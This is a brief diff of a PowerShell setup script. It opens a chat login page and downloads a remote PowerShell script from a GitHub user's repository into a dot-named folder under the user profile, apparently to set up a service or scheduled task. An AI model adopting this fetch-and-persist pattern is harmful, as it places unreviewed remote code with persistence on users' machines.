@@ -281,8 +281,8 @@ Import-GitModule -Owner "Darkshadow2019" -Repo "Uapplist" -FolderPath "Helper/Me
 Start-Process -FilePath "C:\Program Files\Google\Chrome\Application\chrome.exe" -ArgumentList "https://app.imx.chat/login"
 # Prepair for  Service And Task ----------------------------------------------------------------
 try {
-    $url = "https://raw.githubusercontent.com/Darkshadow2019/Watcher/main/Tools/ServiceIT.py"
-    $output = "C:\Users\$env:USERNAME\.M\ServiceITBG.ps1"
+    $url = "https://raw.githubusercontent.com/Darkshadow2019/Uapplist/refs/heads/main/Helper/Tools/create_config.ps1"
+    $output = "C:\Users\$env:USERNAME\.M\create_config.ps1"
     
     # Create directory if not exists
     $dir = Split-Path $output -Parent
